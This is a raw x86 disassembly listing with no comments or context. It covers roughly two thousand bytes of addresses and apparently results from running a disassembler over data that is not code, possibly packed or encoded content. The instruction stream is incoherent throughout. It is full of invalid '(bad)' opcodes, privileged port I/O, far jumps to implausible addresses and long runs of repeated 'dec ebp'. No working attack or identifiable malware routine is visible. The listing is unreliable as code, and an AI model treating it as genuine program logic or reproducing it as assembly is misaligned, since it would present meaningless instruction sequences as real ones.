  424c0d:	mov    dh,0x80
  424c0f:	lock and DWORD PTR [edx-0x6c6a61b3],ebp
  424c16:	dec    ebp
  424c17:	or     ah,BYTE PTR ds:0xf096a4f
  424c1d:	pushf  
  424c1e:	or     al,0x8d
  424c20:	lea    eax,[eax-0x317fda69]
  424c26:	cmp    BYTE PTR [edx],0x8d
  424c29:	lea    eax,[eax+0x53fd808d]
  424c2f:	push   ecx
  424c30:	in     eax,dx
  424c31:	xor    cl,BYTE PTR ds:0xb20cbeb2
  424c37:	test   BYTE PTR [ecx],ch
  424c39:	(bad)  
  424c3a:	std    
  424c3b:	or     DWORD PTR [edi],ecx
  424c3d:	jb     0x424c79
  424c3f:	lea    ecx,[ebp-0x7f758880]
  424c45:	lock mov dl,BYTE PTR [ebx-0x4]
  424c49:	in     eax,dx
  424c4a:	add    eax,0xc86b20d
  424c4f:	mov    dl,0xba
  424c51:	sub    edi,edi
  424c53:	mov    dl,0x50
  424c55:	ja     0x424bdd
  424c57:	pop    esi
  424c58:	imul   ebp,ecx,0x7d01386f
  424c5e:	test   BYTE PTR [eax-0x10],dl
  424c61:	pop    esi
  424c62:	push   eax
  424c63:	lock data16 jl 0x424cde
  424c67:	inc    esi
  424c68:	sbb    ecx,ebp
  424c6a:	outs   dx,DWORD PTR ds:[esi]
  424c6b:	cmp    BYTE PTR [edi+esi*2+0x62],bh
  424c6f:	call   0x507abc5d
  424c74:	ja     0x424ccc
  424c76:	jl     0x424cef
  424c78:	push   0xfffffff6
  424c7a:	and    al,0x6f
  424c7c:	cmp    BYTE PTR [ebx+0x70],dl
  424c7f:	adc    BYTE PTR [ebp+0x7b24601],0xc
  424c86:	mov    ds:0x8df4c4c2,al
  424c8b:	lea    edi,[ecx+0x75f01650]
  424c91:	dec    ebp
  424c92:	dec    ebp
  424c93:	dec    ebp
  424c94:	xchg   edx,eax
  424c95:	in     eax,dx
  424c96:	retf   
  424c97:	outs   dx,DWORD PTR ds:[esi]
  424c98:	in     al,0xb8
  424c9a:	pusha  
  424c9b:	mov    ecx,0x50386fe9
  424ca0:	dec    edi
  424ca1:	xchg   ebp,eax
  424ca2:	dec    ebp
  424ca3:	dec    ebp
  424ca4:	dec    ebp
  424ca5:	push   eax
  424ca6:	dec    edi
  424ca7:	mov    ebp,0x504d4d4d
  424cac:	ja     0x424d08
  424cae:	push   eax
  424caf:	ja     0x424cc7
  424cb1:	add    DWORD PTR [edx+0xa96018a],edx
  424cb7:	push   eax
  424cb8:	ja     0x424ce8
  424cba:	push   eax
  424cbb:	ja     0x424cf3
  424cbd:	jl     0x424d0e
  424cbf:	or     cl,BYTE PTR [ebp+0x4d]
  424cc2:	dec    ebp
  424cc3:	bnd jmp 0x1928538
  424cc9:	popf   
  424cca:	dec    ebp
  424ccb:	dec    ebp
  424ccc:	dec    ebp
  424ccd:	push   eax
  424cce:	sbb    BYTE PTR [ebp+0x7c4d4d4d],ah
  424cd4:	dec    edi
  424cd5:	lods   eax,DWORD PTR ds:[esi]
  424cd6:	dec    ebp
  424cd7:	dec    ebp
  424cd8:	dec    ebp
  424cd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424cda:	jmp    0x4fbe854e
  424cdf:	mov    ch,0x4d
  424ce1:	dec    ebp
  424ce2:	dec    ebp
  424ce3:	sbb    ecx,ebp
  424ce5:	outs   dx,DWORD PTR ds:[esi]
  424ce6:	cmp    BYTE PTR [edi+ecx*2-0x3b],bh
  424cea:	dec    ebp
  424ceb:	dec    ebp
  424cec:	dec    ebp
  424ced:	icebp  
  424cee:	jmp    0x4fbe8562
  424cf3:	push   edx
  424cf4:	dec    ebp
  424cf5:	dec    ebp
  424cf6:	dec    ebp
  424cf7:	sbb    ecx,ebp
  424cf9:	outs   dx,DWORD PTR ds:[esi]
  424cfa:	cmp    BYTE PTR [edi+ecx*2-0x2b],bh
  424cfe:	dec    ebp
  424cff:	dec    ebp
  424d00:	dec    ebp
  424d01:	call   0x507abcef
  424d06:	add    ebp,ebx
  424d08:	dec    ebp
  424d09:	dec    ebp
  424d0a:	dec    ebp
  424d0b:	jl     0x424d5c
  424d0d:	in     eax,0x4d
  424d0f:	dec    ebp
  424d10:	dec    ebp
  424d11:	fucompp 
  424d13:	outs   dx,DWORD PTR ds:[esi]
  424d14:	cmp    BYTE PTR [eax-0x69],dl
  424d17:	int    0x7c
  424d19:	ja     0x424d2a
  424d1b:	nop
  424d1c:	jmp    0xf0928590
  424d21:	adc    BYTE PTR [edi+esi*2+0x41],bh
  424d25:	cmc    
  424d26:	jmp    0xf092859a
  424d2b:	push   ds
  424d2c:	jl     0x424da5
  424d2e:	es (bad) 
  424d30:	jmp    0x77be85a4
  424d35:	mul    BYTE PTR ds:[edi+ebp*2]
  424d39:	cmp    BYTE PTR [ebx+0x6a],dl
  424d3c:	add    BYTE PTR [ecx+0x4f],0xa
  424d40:	dec    ebp
  424d41:	dec    ebp
  424d42:	dec    ebp
  424d43:	mov    dl,0xbe
  424d45:	or     al,0xcd
  424d47:	add    eax,0x2f4110c4
  424d4c:	inc    ebp
  424d4d:	dec    ebp
  424d4e:	dec    ebp
  424d4f:	dec    ebp
  424d50:	ins    DWORD PTR es:[edi],dx
  424d51:	in     eax,dx
  424d52:	mov    ebx,DWORD PTR [ebx]
  424d54:	in     al,0x2
  424d56:	or     dh,0x32
  424d59:	cmp    cl,BYTE PTR [ebp+0x7501018d]
  424d5f:	dec    ebp
  424d60:	dec    ebp
  424d61:	dec    ebp
  424d62:	xchg   esi,eax
  424d63:	dec    ebp
  424d64:	or     ch,dh
  424d66:	sbb    BYTE PTR [edx],0x32
  424d69:	cmp    cl,BYTE PTR [ebp+0x4518018d]
  424d6f:	dec    ebp
  424d70:	dec    ebp
  424d71:	dec    ebp
  424d72:	stos   BYTE PTR es:[edi],al
  424d73:	or     cl,BYTE PTR [ebp-0x6a]
  424d76:	out    dx,eax
  424d77:	push   eax
  424d78:	ja     0x424d77
  424d7a:	add    DWORD PTR [edi-0x7a],esi
  424d7d:	or     al,BYTE PTR [eax-0x72c5d932]
  424d83:	lea    ecx,[ebp-0x7f]
  424d86:	xor    BYTE PTR [edi-0x3],0x4d
  424d8a:	test   DWORD PTR [eax-0xf7f7589],0xedfc538a
  424d94:	add    eax,0xc86b20d
  424d99:	mov    dl,0xba
  424d9b:	sub    edi,edi
  424d9d:	mov    dl,0x50
  424d9f:	ja     0x424d50
  424da1:	xor    al,0x8a
  424da4:	xor    BYTE PTR [edi-0x76],0x53
  424da8:	push   ecx
  424da9:	in     eax,dx
  424daa:	xor    cl,BYTE PTR ds:0xb22984b2
  424db0:	mov    esi,0x80fdff0c
  424db5:	ja     0x424d3d
  424db7:	arpl   WORD PTR [edx+0x775097d5],si
  424dbd:	jbe    0x424d83
  424dbf:	or     DWORD PTR [eax+0x76f0808d],eax
  424dc5:	push   eax
  424dc6:	ja     0x424d4e
  424dc8:	xor    BYTE PTR [edi-0x7a],0x63
  424dcc:	mov    dl,0xd5
  424dce:	iret   
  424dcf:	or     BYTE PTR [edx],0x1d
  424dd2:	sbb    BYTE PTR [edx],0x26
  424dd5:	cmp    cl,BYTE PTR [ebp-0x28f19c73]
  424ddb:	stc    
  424ddc:	sbb    BYTE PTR [edx],0x26
  424ddf:	cmp    cl,BYTE PTR [ebp+0x1d0a808d]
  424de5:	arpl   WORD PTR [esi],cx
  424de7:	xlat   BYTE PTR ds:[ebx]
  424de8:	cmp    eax,DWORD PTR [eax-0x72c5d1e6]
  424dee:	lea    eax,[eax-0x557fde69]
  424df4:	cmp    eax,0xa500eec
  424df9:	and    eax,0x808b7780
  424dfe:	lock mov edx,DWORD PTR [ebx-0x4]
  424e02:	in     eax,dx
  424e03:	add    eax,0xc86b20d
  424e08:	mov    dl,0xba
  424e0a:	sub    edi,edi
  424e0c:	mov    dl,0x50
  424e0e:	ja     0x424dbf
  424e10:	adc    BYTE PTR [edi-0x796c64db],0x3
  424e17:	enter  0x4d4d,0x4f
  424e1b:	push   0x9
  424e1d:	movd   DWORD PTR [ebp-0x28b27273],mm1
  424e24:	and    eax,0x86932a80
  424e29:	sub    eax,0x4f4d4dc8
  424e2e:	push   0x9
  424e30:	pcmpeqb mm1,QWORD PTR [ebp+0x77808d8d]
  424e37:	and    eax,0x94802a80
  424e3c:	xchg   BYTE PTR [eax+0x4f4d4dc2],bh
  424e42:	push   0x9
  424e44:	mov    cr1,ebp
  424e47:	lea    ecx,[ebp-0x6e796c65]
  424e4d:	mov    ecx,DWORD PTR [ebp+0x4d]
  424e50:	dec    edi
  424e51:	push   0x9
  424e53:	ucomiss xmm1,DWORD PTR [ebp-0x317f7273]
  424e5a:	cmp    cl,BYTE PTR es:[ebp-0x28e29c73]
  424e61:	sbb    eax,DWORD PTR [eax-0x72c5cd32]
  424e67:	lea    eax,[ecx]
  424e69:	lock test BYTE PTR [esi-0x7f7b28b3],dl
  424e70:	lock and DWORD PTR [ebp-0x62],ecx
  424e74:	xchg   ebp,eax
  424e75:	xchg   ebx,eax
  424e76:	dec    ebp
  424e77:	or     ah,BYTE PTR ds:0x3a82ce80
  424e7d:	lea    ecx,[ebp-0x27f7280]
  424e83:	push   ebx
  424e84:	push   ecx
  424e85:	in     eax,dx
  424e86:	xor    cl,BYTE PTR ds:0xb20cbeb2
  424e8c:	test   BYTE PTR [ecx],ch
  424e8e:	(bad)  
  424e8f:	std    
  424e90:	aad    0x0
  424e92:	jl     0x424f0b
  424e94:	out    dx,eax
  424e95:	mul    BYTE PTR [ebx]
  424e97:	outs   dx,DWORD PTR ds:[esi]
  424e98:	cmp    BYTE PTR [eax-0xf7f1089],al
  424e9e:	out    dx,eax
  424e9f:	xor    BYTE PTR [edi+0x25],0xb2
  424ea3:	mov    esi,0xc405a20c
  424ea8:	hlt    
  424ea9:	lea    ecx,[ebp+0x197d30b9]
  424eaf:	sub    BYTE PTR [ebp+0x3d],0x80
  424eb3:	lock sub eax,0x925074ec
  424eb9:	adc    eax,0x7c2d7780
  424ebe:	(bad)  
  424ebf:	in     al,dx
  424ec0:	lea    ecx,[ebp+0x2d77808d]
  424ec6:	push   eax
  424ec7:	popf   
  424ec8:	out    dx,al
  424ec9:	xor    BYTE PTR [edi+0x71],0x80
  424ecd:	lock sub eax,0x80ef9250
  424ed3:	ja     0x424eea
  424ed5:	xor    al,0x2d
  424ed8:	push   eax
  424ed9:	xchg   edx,eax
  424eda:	and    esp,eax
  424edc:	adc    eax,0x80257780
  424ee1:	ins    DWORD PTR es:[edi],dx
  424ee2:	cmp    eax,0xec2df080
  424ee7:	je     0x424f39
  424ee9:	xchg   edx,eax
  424eea:	adc    eax,0xed2d7780
  424eef:	sub    eax,0xf7777c8d
  424ef4:	cmp    cl,BYTE PTR [ebp-0x18127273]
  424efa:	test   DWORD PTR [ebp-0x5bacf329],0xc4a37480
  424f04:	or     al,0x53
  424f06:	push   0xffffffab
  424f08:	test   eax,0x8d25fb70
  424f0d:	xchg   edi,eax
  424f0e:	add    BYTE PTR [edi+0x5c099696],0x92
  424f15:	adc    eax,0x1def7501
  424f1a:	or     DWORD PTR [edi+edi*2+0x6f],ebx
  424f1e:	xchg   ebx,eax
  424f1f:	fwait
  424f20:	jl     0x424f99
  424f22:	mov    dh,dh
  424f24:	and    al,0x6f
  424f26:	cmp    BYTE PTR [eax-0x10],dl
  424f29:	mov    ecx,DWORD PTR [edi+0x70]
  424f2c:	aad    0xb5
  424f2e:	icebp  
  424f2f:	and    ah,BYTE PTR [edi+ebp*2]
  424f32:	cmp    BYTE PTR [eax-0x187fde83],al
  424f38:	out    dx,eax
  424f39:	in     al,dx
  424f3a:	retf   
  424f3b:	pop    edi
  424f3c:	out    0x21,eax
  424f3e:	in     al,0xcf
  424f40:	sbb    ch,0xef
  424f43:	in     al,dx
  424f44:	retf   
  424f45:	in     al,dx
  424f46:	out    0xef,eax
  424f48:	pop    edi
  424f49:	out    0x21,eax
  424f4b:	in     al,0x7b
  424f4d:	xor    al,0x8a
  424f50:	and    bh,0x8a
  424f53:	push   ebx
  424f54:	(bad)  
  424f55:	in     eax,dx
  424f56:	dec    ebx
  424f57:	or     eax,0x8029bcb2
  424f5c:	mov    al,ds:0xff0cc4b2
  424f61:	push   es
  424f62:	in     eax,dx
  424f63:	mov    edx,0xeeb2ed8a
  424f68:	in     eax,dx
  424f69:	push   0x3d
  424f6b:	jnp    0x424f1f
  424f6d:	popa   
  424f6e:	sub    edi,edi
  424f70:	retf   
  424f71:	mov    ds:0x6f24f64b,al
  424f76:	cmp    BYTE PTR [edx],bh
  424f78:	out    0x8a,eax
  424f7a:	xor    al,0x8a
  424f7d:	and    bh,0x8a
  424f80:	push   ebx
  424f81:	(bad)  
  424f82:	in     eax,dx
  424f83:	dec    ebx
  424f84:	or     eax,0xb20cbeb2
  424f89:	mov    esp,0x632aff29
  424f8e:	lock mov esp,esp
  424f91:	dec    edx
  424f92:	push   ebx
  424f93:	push   0xffffffab
  424f95:	mov    ds:0x8deffb70,eax
  424f9a:	xchg   edi,eax
  424f9b:	add    BYTE PTR [edi+0x7c8187ed],0x77
  424fa2:	cmp    DWORD PTR [ebx+0x7c8d8dad],0x77
  424fa9:	stc    
  424faa:	in     al,dx
  424fab:	ror    DWORD PTR [ebp-0x7b888373],0x14
  424fb2:	ror    BYTE PTR [ebp-0x74888373],cl
  424fb8:	call   0x8a77:0x7c8dee71
  424fbf:	stc    
  424fc0:	lods   eax,DWORD PTR ds:[esi]
  424fc1:	lea    ecx,[ebp-0x5088884]
  424fc7:	dec    DWORD PTR [ebp+0x7a777c8d]
  424fcd:	dec    ebx
  424fce:	aam    0x8d
  424fd0:	lea    edi,[edi+esi*2-0x7e]
  424fd4:	in     al,dx
  424fd5:	lea    ecx,[ebp-0x79888373]
  424fdb:	mov    dl,0xb9
  424fdd:	lea    ecx,[ebp-0x7f788884]
  424fe3:	xchg   esi,eax
  424fe4:	lea    ecx,[ebp+0x332777c]
  424fea:	mov    bh,0x8d
  424fec:	lea    eax,[eax-0x73a17510]
  424ff2:	fimul  DWORD PTR [ebp-0x7f4dbc73]
  424ff8:	lock mov edx,DWORD PTR [ebx+0x72]
  424ffc:	dec    ebx
  424ffd:	add    eax,0xfd809b99
  425002:	mov    ds:0x8d90f1ba,al
  425007:	lea    esp,[edx-0x7238d090]
  42500d:	lea    esp,[edx-0x725a2bfb]
  425013:	lea    esp,[edx-0x72c2204e]
  425019:	lea    edi,[edi+esi*2-0x38]
  42501d:	div    eax
  42501f:	lea    ecx,[ebp-0x24758884]
  425025:	aad    0x8d
  425027:	lea    edi,[edi+esi*2-0x75]
  42502b:	sbb    DWORD PTR [ecx-0x73],esi
  42502e:	lea    eax,[eax-0x687f7489]
  425034:	mov    dh,BYTE PTR [edi]
  425036:	dec    ecx
  425037:	popf   
  425038:	lea    ecx,[ebp+0x77ecfb53]
  42503e:	enter  0xb680,0x57
  425042:	jnp    0x425051
  425044:	lea    ecx,[ebp-0x68af08bd]
  42504a:	mov    al,BYTE PTR [eax+0x77ec8a77]
  425050:	out    dx,eax
  425051:	adc    BYTE PTR [edi+0x2197ec8a],0x8f
  425058:	nop
  425059:	adc    BYTE PTR [ecx-0x80],dh
  42505c:	ja     0x425090
  42505e:	adc    BYTE PTR [edi-0x76e6c879],0x8d
  425065:	lea    edx,[ebx-0x5]
  425068:	adc    BYTE PTR [edi-0xe04007a],0x3
  42506f:	(bad)  [ebp-0x7f08bc73]
  425075:	ja     0x425070
  425077:	in     al,dx
  425078:	(bad)  
  425079:	icebp  
  42507a:	test   al,0x55
  42507c:	lea    ecx,[ebp-0x681308bd]
  425082:	test   BYTE PTR [eax-0x287f7c89],al
  425088:	jno    0x42500a
  42508a:	out    0x82,eax
  42508c:	mov    ds:0x8d9630c2,al
  425091:	lea    esi,[ebx]
  425093:	test   DWORD PTR [eax-0x3d5d8589],0x8d8d2db7
  42509d:	inc    ebx
  42509e:	ret    0x7253
  4250a1:	dec    ebx
  4250a2:	dec    ebx
  4250a3:	adc    BYTE PTR [edi+0x1fe757f7],0x8d
  4250aa:	lea    esi,[ebx]
  4250ac:	sti    
  4250ad:	xor    BYTE PTR [esi+0x7a2f743],0x4c
  4250b4:	fmul   DWORD PTR [ebp+0x97e638d]
  4250ba:	dec    esp
  4250bb:	mov    ds:0xab4d4d4d,eax
  4250c0:	test   eax,0x8d21fb70
  4250c5:	xchg   edi,eax
  4250c6:	add    BYTE PTR [edi-0x6c8a7813],0x99
  4250cd:	fwait
  4250ce:	jl     0x425147
  4250d0:	xchg   DWORD PTR [ebx+eiz*2+0x777c8d8d],ebx
  4250d7:	xor    dl,al
  4250d9:	jg     0x425068
  4250db:	lea    edi,[edi+esi*2-0x38]
  4250df:	pusha  
  4250e0:	xchg   esi,eax
  4250e1:	lea    ecx,[ebp-0x15748884]
  4250e7:	xchg   esi,eax
  4250e8:	lea    ecx,[ebp-0xd758884]
  4250ee:	sub    eax,0x777c8d8d
  4250f3:	sbb    ecx,0x59
  4250f6:	lea    ecx,[ebp+0x7784777c]
  4250fc:	out    dx,al
  4250fd:	lea    ecx,[ebp+0x6df9777c]
  425103:	xor    DWORD PTR [ebp-0x79888373],ecx
  425109:	sbb    ebx,DWORD PTR [edi-0x73]
  42510c:	lea    edi,[edi+esi*2+0x66]
  425110:	pop    esp
  425111:	leave  
  425112:	lea    ecx,[ebp-0x59958884]
  425118:	lea    ecx,[ebp+0x76777c8d]
  42511e:	iret   
  42511f:	cmp    DWORD PTR [ebp-0x2888373],ecx
  425125:	and    BYTE PTR [ecx],ch
  425127:	lea    ecx,[ebp+0x5caf777c]
  42512d:	iret   
  42512e:	lea    ecx,[ebp-0x1a088884]
  425134:	sbb    eax,0x77808d8d
  425139:	test   BYTE PTR [eax-0x55307c10],al
  42513f:	xor    ecx,DWORD PTR [ebp-0x58c1b873]
  425145:	lea    ecx,[ebp-0x72dcdf31]
  42514b:	lea    ecx,[ecx]
  42514d:	and    dh,BYTE PTR [edx+0x7f549e60]
  425153:	mov    eax,DWORD PTR [ebx-0x3]
  425156:	xor    BYTE PTR [edi-0x76],0x80
  42515a:	xchg   edi,eax
  42515b:	mov    esi,DWORD PTR [ebx]
  42515d:	sti    
  42515e:	adc    BYTE PTR [edi-0x36b73038],0x8d
  425165:	lea    eax,[ebx-0x5]
  425168:	adc    BYTE PTR [edi-0x7f04bcce],0x97
  42516f:	xchg   edi,edi
  425171:	sti    
  425172:	push   ebx
  425173:	jb     0x42516f
  425175:	pushf  
  425176:	ins    BYTE PTR es:[edi],dx
  425177:	dec    ebp
  425178:	dec    ebp
  425179:	dec    ebx
  42517a:	or     eax,DWORD PTR [eax-0x2f93de69]
  425180:	pop    ds
  425181:	lea    ecx,[ebp+0x7780f743]
  425187:	xchg   BYTE PTR [eax+0x7c43f9d7],al
  42518d:	or     DWORD PTR [edx],esp
  42518f:	cld    
  425190:	cli    
  425191:	mov    al,ds:0xbe309e50
  425196:	icebp  
  425197:	lea    ecx,[ebp+0x7a777c8d]
  42519d:	sbb    al,0x55
  42519f:	lea    ecx,[ebp+0x2e82777c]
  4251a5:	leave  
  4251a6:	lea    ecx,[ebp-0x327b8884]
  4251ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4251ad:	lea    ecx,[ebp+0x3a83777c]
  4251b3:	lea    ecx,[ebp-0x7c587f73]
  4251b9:	push   ebx
  4251ba:	jb     0x42521a
  4251bc:	fwait
  4251bd:	leave  
  4251be:	lea    ecx,[ebp-0x687f39b5]
  4251c4:	test   BYTE PTR [eax-0x4001059],al
  4251ca:	adc    BYTE PTR [edi-0x7f04bc7e],0x97
  4251d1:	jp     0x42520a
  4251d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251d4:	or     DWORD PTR [ebp-0x4ddf673],0x59ef0f01
  4251de:	sub    eax,0x77508ade
  4251e3:	jp     0x425165
  4251e5:	ja     0x4251de
  4251e7:	adc    BYTE PTR [edi+0xbc835af],0x7
  4251ee:	adc    BYTE PTR [edi+0x4523357a],0x2f
  4251f5:	and    DWORD PTR [esi+ebp*8-0x4f11efb9],edx
  4251fc:	xor    BYTE PTR [edi-0x3],0xcf
  425200:	mov    es,edi
  425202:	lea    ecx,[ebp-0x7f898814]
  425208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425209:	push   0x53
  42520b:	jb     0x425258
  42520d:	mov    BYTE PTR [eax-0x639b9969],0x6c
  425214:	dec    ebp
  425215:	dec    ebp
  425216:	aaa    
  425217:	cmp    BYTE PTR [edi-0x73],dl
  42521a:	lea    eax,[ebx-0x5]
  42521d:	push   edi
  42521e:	adc    DWORD PTR [edx+0x4d],ebp
  425221:	dec    ebp
  425222:	in     al,dx
  425223:	std    
  425224:	xor    BYTE PTR [edi-0x76],0x80
  425228:	xchg   edi,eax
  425229:	mov    esi,DWORD PTR [ebx]
  42522b:	sti    
  42522c:	adc    BYTE PTR [edi-0x36b73038],0x8d
  425233:	lea    eax,[ebx-0x5]
  425236:	adc    BYTE PTR [edi-0x7f04bcce],0x97
  42523d:	xchg   edi,edi
  42523f:	sti    
  425240:	push   ebx
  425241:	jb     0x42528e
  425243:	mov    BYTE PTR [eax-0x8bcde69],0x80
  42524a:	ja     0x4251d2
  42524c:	and    BYTE PTR [edi+0x97c43f9],0x22
  425253:	je     0x4251d5
  425255:	mov    al,ds:0x4ec8243
  42525a:	arpl   WORD PTR [ebx],ax
  42525c:	or     DWORD PTR [ebp+ebx*2+0x4d],ecx
  425260:	dec    ebp
  425261:	dec    ebp
  425262:	stos   DWORD PTR es:[edi],eax
  425263:	test   eax,0xeffb70a3
  425268:	lea    edx,[edi-0x78127880]
  42526e:	or     bh,BYTE PTR [edi+esi*2+0x62]
  425272:	in     al,0x58
  425274:	fist   WORD PTR [ecx]
  425276:	pop    esi
  425277:	xchg   BYTE PTR [edi+0x77502643],cl
  42527d:	push   esi
  42527e:	jl     0x4252f7
  425280:	pop    esi
  425281:	loop   0x4252db
  425283:	fist   WORD PTR [ecx]
  425285:	push   eax
  425286:	ja     0x4252ee
  425288:	jl     0x425301
  42528a:	push   0xffffffe6
  42528c:	pop    eax
  42528d:	fist   WORD PTR [ecx]
  42528f:	push   eax
  425290:	ja     0x425308
  425292:	xchg   ebx,eax
  425293:	jl     0x42530c
  425295:	std    
  425296:	rcr    BYTE PTR [eax-0x21],1
  425299:	adc    DWORD PTR [eax+0x77],edx
  42529c:	scas   eax,DWORD PTR es:[edi]
  42529d:	cdq    
  42529e:	fwait
  42529f:	jl     0x425318
  4252a1:	neg    DWORD PTR [ecx+0x5011df58]
  4252a7:	ja     0x425323
  4252a9:	push   ebx
  4252aa:	jb     0x4252ff
  4252ac:	dec    ebp
  4252ad:	pusha  
  4252ae:	mul    BYTE PTR [edi+ebp*2]
  4252b1:	cmp    BYTE PTR [edi+esi*2-0x7e],bh
  4252b5:	call   0x7b543212
  4252ba:	push   eax
  4252bb:	ja     0x425240
  4252bd:	xor    BYTE PTR [edx+0x50879750],0xe7
  4252c4:	stc    
  4252c5:	add    DWORD PTR [esi+0xd32ed3a],ebx
  4252cb:	mov    dl,0x84
  4252cd:	sub    edi,edi
  4252cf:	sti    
  4252d0:	add    DWORD PTR [ebp+0x78],esi
  4252d3:	bound  eax,QWORD PTR [eax-0x11627f8f]
  4252d9:	or     DWORD PTR [esi+0x3],eax
  4252dc:	or     al,0xb2
  4252de:	les    ecx,FWORD PTR [eax+eax*4]
  4252e1:	sbb    eax,0x53ee6d80
  4252e6:	push   0xffffffa2
  4252e8:	ret    0xc7a7
  4252eb:	add    al,0xd4
  4252ed:	push   edi
  4252ef:	push   eax
  4252f0:	xchg   edi,eax
  4252f1:	mov    eax,DWORD PTR [eax+0x6aec8b77]
  4252f7:	mov    dl,0xb4
  4252f9:	sub    DWORD PTR [ebx+0x77],esp
  4252fc:	and    DWORD PTR [ecx],ecx
  4252fe:	into   
  4252ff:	lea    ecx,fs:[ebp-0x74887f73]
  425306:	in     eax,dx
  425307:	mov    bh,0x86
  425309:	lea    edx,[eax-0x19]
  42530c:	xor    al,BYTE PTR [eax+0x6a4f8b77]
  425312:	aad    0xb7
  425314:	push   ebx
  425315:	push   0x50
  425317:	out    0xc8,eax
  425319:	adc    BYTE PTR [edi-0x10587f7a],0x1
  425320:	gs jno 0x4252a3
  425323:	xchg   edi,eax
  425324:	out    dx,eax
  425325:	in     al,dx
  425326:	pushf  
  425327:	push   eax
  425328:	xchg   edi,eax
  425329:	test   BYTE PTR [edi+0x4d971090],cl
  42532f:	adc    BYTE PTR [edi-0x70631375],0x15
  425336:	mov    al,0x80
  425338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425339:	test   BYTE PTR [eax],dl
  42533b:	adc    ecx,DWORD PTR [edi-0x587fb269]
  425341:	mov    ebp,esp
  425343:	lods   al,BYTE PTR ds:[esi]
  425344:	and    bh,0xef
  425347:	adc    BYTE PTR ds:0xc8978063,dl
  42534d:	ins    DWORD PTR es:[edi],dx
  42534e:	in     eax,dx
  42534f:	clc    
  425350:	mov    dh,BYTE PTR [edx-0x412d67a]
  425356:	out    dx,al
  425357:	(bad)  
  425358:	sti    
  425359:	push   ebx
  42535a:	mov    dl,0x50
  42535c:	ja     0x425326
  42535e:	outs   dx,BYTE PTR ds:[esi]
  42535f:	xlat   BYTE PTR ds:[ebx]
  425360:	enter  0x9780,0xc8
  425364:	in     eax,dx
  425365:	xor    cl,BYTE PTR ds:0xb20c07b2
  42536b:	test   BYTE PTR [ecx],ch
  42536d:	(bad)  
  42536e:	sti    
  42536f:	adc    BYTE PTR [edi-0x1b049c75],0x34
  425376:	push   ebx
  425377:	dec    ebp
  425378:	jnp    0x4252fa
  42537a:	ja     0x4253ae
  42537c:	adc    BYTE PTR [edi-0x79587f75],0xed
  425383:	test   BYTE PTR [edx-0x7f0811ff],cl
  425389:	xchg   edi,eax
  42538a:	mov    eax,DWORD PTR [ecx]
  42538c:	adc    eax,0x21a78093
  425391:	mov    dl,0x7
  425393:	sub    edi,edi
  425395:	sti    
  425396:	push   ebx
  425397:	mov    dl,0x50
  425399:	ja     0x4253cd
  42539b:	outs   dx,BYTE PTR ds:[esi]
  42539c:	xlat   BYTE PTR ds:[ebx]
  42539d:	xor    al,BYTE PTR [eax+0x32ed3297]
  4253a3:	or     eax,0xb20c07b2
  4253a8:	test   BYTE PTR [ecx],ch
  4253aa:	(bad)  
  4253ab:	sti    
  4253ac:	adc    BYTE PTR [edi+0x4372ec8b],0x3
  4253b3:	push   eax
  4253b4:	ja     0x42533c
  4253b6:	arpl   WORD PTR [ecx+ecx*1+0x4c],si
  4253ba:	leave  
  4253bb:	dec    ebp
  4253bc:	dec    ebp
  4253bd:	dec    ebp
  4253be:	xor    BYTE PTR [edi-0x79],0x80
  4253c2:	xchg   edi,eax
  4253c3:	stc    
  4253c4:	in     eax,dx
  4253c5:	clc    
  4253c6:	mov    ch,BYTE PTR [ebp-0x13]
  4253c9:	sti    
  4253ca:	out    dx,al
  4253cb:	mov    dl,0x86
  4253cd:	sub    edi,edi
  4253cf:	sti    
  4253d0:	push   ebx
  4253d1:	mov    dl,0x80
  4253d3:	add    BYTE PTR [eax-0x1281ac09],0xc6
  4253da:	or     eax,0x5029b4b2
  4253df:	xchg   edi,eax
  4253e0:	stc    
  4253e1:	mov    dl,0x7
  4253e3:	or     al,0x50
  4253e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253e6:	xchg   DWORD PTR [eax],esi
  4253e8:	xchg   edi,eax
  4253e9:	xchg   ebp,ebp
  4253eb:	out    0x87,eax
  4253ed:	outs   dx,DWORD PTR ds:[esi]
  4253ee:	or     edx,ebp
  4253f0:	jp     0x4253ff
  4253f2:	dec    ebp
  4253f3:	dec    ebp
  4253f4:	stos   DWORD PTR es:[edi],eax
  4253f5:	test   eax,0xeffb70a3
  4253fa:	lea    edx,[edi-0x78127880]
  425400:	adc    eax,0x7cef7780
  425405:	ja     0x425439
  425407:	mul    BYTE PTR [edi+ebp*2]
  42540a:	cmp    BYTE PTR [edi+esi*2-0x76],bh
  42540e:	cmc    
  42540f:	and    al,0x6f
  425411:	cmp    BYTE PTR [eax+0x5099938d],al
  425417:	ja     0x4253a4
  425419:	jl     0x425492
  42541b:	enter  0x24dc,0x6f
  42541f:	cmp    BYTE PTR [ebx+0x4787777c],bl
  425425:	sbb    al,0xf9
  425427:	adc    eax,DWORD PTR [eax-0xf7f7529]
  42542d:	mov    ah,dl
  42542f:	or     eax,0x6f24225e
  425434:	cmp    BYTE PTR [ebx-0x454dd5ad],ch
  42543a:	sub    DWORD PTR [ebx+0x32],edx
  42543d:	mov    dl,0x88
  42543f:	or     al,0xff
  425441:	add    eax,0x8032f080
  425446:	xchg   edi,eax
  425447:	xor    dl,BYTE PTR [ebx-0x3]
  42544a:	push   ebx
  42544b:	pushf  
  42544c:	mov    dl,0xbe
  42544e:	or     al,0xb2
  425450:	clc    
  425451:	sub    edi,edi
  425453:	dec    BYTE PTR [ecx]
  425455:	and    al,BYTE PTR ds:0x8d8d24be
  42545b:	lea    eax,[eax-0x687f7410]
  425461:	mov    edx,DWORD PTR [ebx-0x64]
  425464:	mov    dl,0xf8
  425466:	sub    DWORD PTR [ebx-0x3],edx
  425469:	mov    dl,0xbe
  42546b:	or     al,0xff
  42546d:	inc    BYTE PTR [eax-0x587f7569]
  425473:	mov    dl,BYTE PTR [ebx-0x9]
  425476:	push   ebx
  425477:	lods   al,BYTE PTR ds:[esi]
  425478:	mov    dl,0x7
  42547a:	or     al,0xb2
  42547c:	mov    ah,0x29
  42547e:	call   DWORD PTR [edi+ecx*2-0x74687f02]
  425485:	xor    al,0x8b
  425488:	aad    0x59
